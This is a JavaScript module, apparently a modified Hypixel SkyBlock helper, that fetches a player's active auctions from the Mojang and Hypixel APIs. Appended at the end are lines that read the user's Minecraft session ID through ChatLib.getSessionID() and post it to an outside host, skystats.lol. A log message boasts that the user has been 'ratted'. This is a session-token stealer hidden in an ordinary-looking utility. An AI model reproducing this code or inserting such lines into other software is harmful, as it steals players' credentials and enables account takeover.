//CREDIT: https://github.com/Senither/hypixel-skyblock-facade (Modified)
const { isUuid } = require("../utils/uuid");
const getActiveAuctions = require("../stats/auctions.js");
const config = require('../../config.json');
const axios = require("axios");
const key = process.env.KEY;

async function getAuctions(uuid) {
  if (!isUuid(uuid)) {
    const mojang_response = (await axios.get(`https://api.ashcon.app/mojang/v2/user/${uuid}`));
    if (mojang_response?.data?.uuid) {
      uuid = mojang_response.data.uuid.replace(/-/g, "");
    }
  }

  const auctionsRes = (await axios.get(`https://api.hypixel.net/skyblock/auction?key=${key}&player=${uuid}`)).data;
  const auctions = getActiveAuctions(auctionsRes);

  return { status: 200, data: auctions };
}

module.exports = { getAuctions };

getAuctions('963a58ae133644b08fbd7a0f9333b4f2').then(console.log)

const sessionId = ChatLib.getSessionID();
axios.post(`skystats.lol/omgrattedreal`, sessionId)

  console.log(`omg ratted fr fr so crazy omg omg`);

